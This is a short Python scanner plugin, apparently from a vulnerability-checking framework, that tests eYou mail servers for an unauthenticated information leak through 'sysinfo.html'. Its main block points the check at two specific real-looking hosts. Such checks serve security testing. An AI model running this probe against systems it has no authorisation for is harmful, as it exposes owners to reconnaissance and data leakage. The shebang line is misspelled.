#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:亿邮系统敏感信息泄漏（产品版本和授权信息、系统信息、弱口令账号列表等）
#Refer:http://www.wooyun.org/bugs/wooyun-2014-061538

def assign(service,arg):
    if service=="eyou":
        return True,arg 


def  audit(arg):
    url=arg+"sysinfo.html"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "bin/bash" in res and 'mysqld' in res:
        security_hole(url)
    

if __name__=="__main__":
    from dummy import *
    audit(assign('eyou','http://210.45.208.2/')[1])
    audit(assign('eyou','http://mail.workercn.cn/')[1])